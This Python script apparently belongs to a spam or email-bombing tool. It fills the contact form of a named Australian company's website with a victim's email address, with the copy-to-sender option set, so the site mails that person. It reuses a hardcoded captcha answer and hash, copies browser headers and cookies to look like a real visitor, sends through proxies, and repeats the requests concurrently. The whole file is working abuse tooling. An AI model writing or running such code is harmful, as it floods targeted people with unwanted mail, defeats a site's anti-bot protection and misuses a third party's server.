from os.path import basename

import requests

from module import Spam

cookies = {
    '__utma': '157267385.2136565143.1677767707.1677767707.1677767707.1',
    '__utmc': '157267385',
    '__utmz': '157267385.1677767707.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '__utmt': '1',
    '__utmb': '157267385.3.10.1677767707',
}

headers = {
    'authority': 'synergyaudit.com.au',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '__utma=157267385.2136565143.1677767707.1677767707.1677767707.1; __utmc=157267385; __utmz=157267385.1677767707.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmt=1; __utmb=157267385.3.10.1677767707',
    'origin': 'https://synergyaudit.com.au',
    'pragma': 'no-cache',
    'referer': 'https://synergyaudit.com.au/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(False)
        data = {
            'name': 'name',
            'company': 'text',
            'email': target,
            'phone': '121212121231',
            'message': text,
            'cc': '1',
            'answer': '12',
            'answer_hash': '8f8c43d349ee7e7502e80408ed6577f7',
            'contactButton': 'Send',
        }

        response = requests.post('https://synergyaudit.com.au/contact.php', cookies=cookies, headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'Thank You'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
